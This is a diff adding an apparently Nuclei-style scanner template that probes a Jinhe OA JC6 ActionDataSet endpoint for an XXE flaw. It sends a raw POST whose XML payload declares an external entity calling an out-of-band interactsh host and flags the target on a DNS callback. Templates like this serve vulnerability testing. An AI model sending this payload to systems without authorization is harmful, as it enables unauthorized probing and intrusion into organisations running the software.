@@ -1,0 +1,22 @@
+id: jinheOA-JC6-ActionDataSet-XXE
+info:
+  name: 金和OA JC6 ActionDataSet XXE漏洞
+  author: xxx
+  severity: high
+  tags: XXE
+
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/ActionDataSet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
